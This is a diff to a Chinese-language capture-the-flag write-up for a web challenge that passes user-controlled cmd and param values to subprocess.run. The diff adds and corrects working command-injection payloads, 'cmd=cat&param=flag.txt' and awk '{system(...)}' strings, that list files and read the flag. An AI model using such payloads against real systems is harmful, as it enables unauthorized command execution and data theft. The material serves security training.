@@ -82,11 +82,17 @@ tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)
 6. `timeout=5`: 这是 `subprocess.run` 函数的参数，指定了运行外部命令的超时时间，单位是秒。在这里，设置为 5 秒。
 
 cmd是执行的命令，param是执行的参数
+可以直接
+```
+cmd=cat&param=flag.txt
+```
+
 python中有一个awk命令，可以执行系统命令，长度刚好为3
-格式为：awk '(system("ls")' 
+格式为：awk '{system("ls")}' 
 通过抓包分析，传参方式为post，根据可控参数cmd和param
 通过awk构造payload
 payload:
+```
 cmd=awk&param={system("ls")}//查看当前路径下所有文件
-cmd=awk&param={system("cat fla*")}//查爱fLag文件的内容
-
+cmd=awk&param={system("cat fla*")}//查看fLag文件的内容
+```
